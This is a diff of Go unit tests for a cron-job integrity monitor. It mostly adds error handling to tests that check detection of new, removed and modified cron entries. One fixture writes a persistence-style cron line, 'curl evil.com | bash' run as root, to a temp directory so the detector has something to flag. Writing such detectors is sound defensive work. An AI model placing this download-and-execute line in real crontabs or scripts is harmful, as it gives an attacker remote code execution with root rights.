@@ -29,12 +29,12 @@ func TestLearningMode(t *testing.T) {
 	cfg := testModuleConfig(t)
 	dir := t.TempDir()
 	crontab := filepath.Join(dir, "crontab")
-	os.WriteFile(crontab, []byte("*/5 * * * * root /usr/bin/backup\n"), 0644)
+	_ = os.WriteFile(crontab, []byte("*/5 * * * * root /usr/bin/backup\n"), 0644)
 
 	m := New()
 	m.CrontabPath = crontab
 	m.CronDirs = nil
-	m.Init(cfg)
+	_ = m.Init(cfg)
 
 	findings, err := m.Scan(context.Background())
 	if err != nil {
@@ -49,17 +49,19 @@ func TestDetectsNewCron(t *testing.T) {
 	cfg := testModuleConfig(t)
 	dir := t.TempDir()
 	cronDir := filepath.Join(dir, "cron.d")
-	os.MkdirAll(cronDir, 0755)
+	if err := os.MkdirAll(cronDir, 0755); err != nil {
+		t.Fatal(err)
+	}
 
 	m := New()
 	m.CrontabPath = filepath.Join(dir, "crontab")
-	os.WriteFile(m.CrontabPath, []byte(""), 0644)
+	_ = os.WriteFile(m.CrontabPath, []byte(""), 0644)
 	m.CronDirs = []string{cronDir}
-	m.Init(cfg)
-	m.Scan(context.Background()) // baseline (empty)
+	_ = m.Init(cfg)
+	_, _ = m.Scan(context.Background()) // baseline (empty)
 
 	// Add a cron job
-	os.WriteFile(filepath.Join(cronDir, "backdoor"), []byte("* * * * * root curl evil.com | bash\n"), 0644)
+	_ = os.WriteFile(filepath.Join(cronDir, "backdoor"), []byte("* * * * * root curl evil.com | bash\n"), 0644)
 
 	findings, _ := m.Scan(context.Background())
 	if len(findings) == 0 {
@@ -80,18 +82,20 @@ func TestDetectsRemovedCron(t *testing.T) {
 	cfg := testModuleConfig(t)
 	dir := t.TempDir()
 	cronDir := filepath.Join(dir, "cron.d")
-	os.MkdirAll(cronDir, 0755)
+	if err := os.MkdirAll(cronDir, 0755); err != nil {
+		t.Fatal(err)
+	}
 	cronFile := filepath.Join(cronDir, "backup")
-	os.WriteFile(cronFile, []byte("0 2 * * * root /usr/bin/backup\n"), 0644)
+	_ = os.WriteFile(cronFile, []byte("0 2 * * * root /usr/bin/backup\n"), 0644)
 
 	m := New()
 	m.CrontabPath = filepath.Join(dir, "empty")
-	os.WriteFile(m.CrontabPath, []byte(""), 0644)
+	_ = os.WriteFile(m.CrontabPath, []byte(""), 0644)
 	m.CronDirs = []string{cronDir}
-	m.Init(cfg)
-	m.Scan(context.Background()) // baseline
+	_ = m.Init(cfg)
+	_, _ = m.Scan(context.Background()) // baseline
 
-	os.Remove(cronFile)
+	_ = os.Remove(cronFile)
 
 	findings, _ := m.Scan(context.Background())
 	found := false
@@ -109,16 +113,16 @@ func TestDetectsModifiedCron(t *testing.T) {
 	cfg := testModuleConfig(t)
 	dir := t.TempDir()
 	crontab := filepath.Join(dir, "crontab")
-	os.WriteFile(crontab, []byte("0 2 * * * root /usr/bin/backup\n"), 0644)
+	_ = os.WriteFile(crontab, []byte("0 2 * * * root /usr/bin/backup\n"), 0644)
 
 	m := New()
 	m.CrontabPath = crontab
 	m.CronDirs = nil
-	m.Init(cfg)
-	m.Scan(context.Background()) // baseline
+	_ = m.Init(cfg)
+	_, _ = m.Scan(context.Background()) // baseline
 
 	// Modify the cron
-	os.WriteFile(crontab, []byte("0 2 * * * root /usr/bin/evil\n"), 0644)
+	_ = os.WriteFile(crontab, []byte("0 2 * * * root /usr/bin/evil\n"), 0644)
 
 	findings, _ := m.Scan(context.Background())
 	if len(findings) < 1 {
@@ -129,7 +133,7 @@ func TestDetectsModifiedCron(t *testing.T) {
 func TestSkipsComments(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "crontab")
-	os.WriteFile(path, []byte("# comment\n\nSHELL=/bin/bash\n0 * * * * root test\n"), 0644)
+	_ = os.WriteFile(path, []byte("# comment\n\nSHELL=/bin/bash\n0 * * * * root test\n"), 0644)
 
 	entries := scanCronFile(path)
 	if len(entries) != 1 {
@@ -141,16 +145,18 @@ func TestRebaseline(t *testing.T) {
 	cfg := testModuleConfig(t)
 	dir := t.TempDir()
 	crontab := filepath.Join(dir, "crontab")
-	os.WriteFile(crontab, []byte("0 * * * * root test\n"), 0644)
+	_ = os.WriteFile(crontab, []byte("0 * * * * root test\n"), 0644)
 
 	m := New()
 	m.CrontabPath = crontab
 	m.CronDirs = nil
-	m.Init(cfg)
-	m.Scan(context.Background())
+	_ = m.Init(cfg)
+	_, _ = m.Scan(context.Background())
 
-	os.WriteFile(crontab, []byte("0 * * * * root newcommand\n"), 0644)
-	m.Rebaseline(context.Background())
+	_ = os.WriteFile(crontab, []byte("0 * * * * root newcommand\n"), 0644)
+	if err := m.Rebaseline(context.Background()); err != nil {
+		t.Fatal(err)
+	}
 
 	findings, _ := m.Scan(context.Background())
 	if len(findings) != 0 {
